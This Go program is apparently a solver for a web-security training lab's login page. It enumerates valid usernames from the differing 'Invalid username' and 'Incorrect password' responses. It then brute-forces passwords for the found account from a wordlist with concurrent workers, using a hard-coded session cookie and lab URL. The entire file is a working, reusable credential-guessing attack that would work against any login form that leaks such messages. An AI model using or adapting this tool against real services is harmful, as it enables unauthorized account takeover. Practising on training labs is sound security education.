
package main

import (
    "fmt"
    "io"
    "log"
    "net/http"
    "net/url"
    "os"
    "strings"
    "sync"
    "time"
)

const (
    endpoint = "https://0af50096046c44be80acb712005d007b.web-security-academy.net/login"
    session  = "diL3YpYlI4LATvVNT7vdCIAxlwkLQUw4"
    workers  = 2
)

type Credential struct {
    Username string
    Password string
}

type Result struct {
    Credential
    Status int
    Length int
    Message string
}

func loadLines(path string) []string {
    data, err := os.ReadFile(path)
    if err != nil {
        log.Fatal(err)
    }

    return strings.Fields(string(data))
}

func test(client *http.Client, c Credential) Result {
    result := Result{Credential: c, Message: "ERROR"}

    form := url.Values{
        "username": {c.Username},
        "password": {c.Password},
    }

    req, err := http.NewRequest("POST", endpoint, strings.NewReader(form.Encode()))
    if err != nil {
        return result
    }

    req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
    req.AddCookie(&http.Cookie{Name: "session", Value: session})

    resp, err := client.Do(req)
    if err != nil {
        return result
    }
    defer resp.Body.Close()

    body, err := io.ReadAll(resp.Body)
    if err != nil {
        return result
    }

    result.Status = resp.StatusCode
    result.Length = len(body)

    switch {
    case resp.StatusCode == http.StatusFound:
        result.Message = "SUCCESS"
    case strings.Contains(string(body), "Invalid username"):
        result.Message = "Invalid username"
    case strings.Contains(string(body), "Incorrect password"):
        result.Message = "Incorrect password"
    default:
        result.Message = "Check response"
    }

    return result
}

func run(client *http.Client, credentials []Credential) []Result {
    jobs := make(chan Credential)
    results := make(chan Result)

    var wg sync.WaitGroup

    for i := 0; i < workers; i++ {
        wg.Add(1)

        go func() {
            defer wg.Done()

            for c := range jobs {
                results <- test(client, c)
            }
        }()
    }

    go func() {
        for _, c := range credentials {
            jobs <- c
        }

        close(jobs)
        wg.Wait()
        close(results)
    }()

    fmt.Printf("%-20s %-20s %-8s %-8s %s\n",
        "Username", "Password", "Status", "Length", "Response")

    var output []Result

    for r := range results {
        fmt.Printf("%-20s %-20s %-8d %-8d %s\n",
            r.Username, r.Password, r.Status, r.Length, r.Message)

        output = append(output, r)
    }

    return output
}

func main() {
    usernames := loadLines("usernames.txt")
    passwords := loadLines("passwords.txt")

    if len(usernames) == 0 || len(passwords) == 0 {
        log.Fatal("Empty wordlist")
    }

    client := &http.Client{
        Timeout: 10 * time.Second,
        Transport: &http.Transport{
            ForceAttemptHTTP2: false,
        },
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            return http.ErrUseLastResponse
        },
    }

    fmt.Println("=== USERNAME ENUMERATION ===")

    var candidates []Credential

    for _, username := range usernames {
        candidates = append(candidates, Credential{
            Username: username,
            Password: passwords[0],
        })
    }

    results := run(client, candidates)

    valid := ""

    for _, r := range results {
        if r.Message == "Incorrect password" || r.Message == "SUCCESS" {
            valid = r.Username
            break
        }
    }

    if valid == "" {
        log.Fatal("No valid username identified")
    }

    fmt.Println("\nValid username:", valid)
    fmt.Println("\n=== PASSWORD TESTING ===")

    candidates = nil

    for _, password := range passwords {
        candidates = append(candidates, Credential{
            Username: valid,
            Password: password,
        })
    }

    results = run(client, candidates)

    for _, r := range results {
        if r.Message == "SUCCESS" {
            fmt.Printf("\nPossible match: %s:%s\n", r.Username, r.Password)
            return
        }
    }

    fmt.Println("\nNo successful login detected")
}
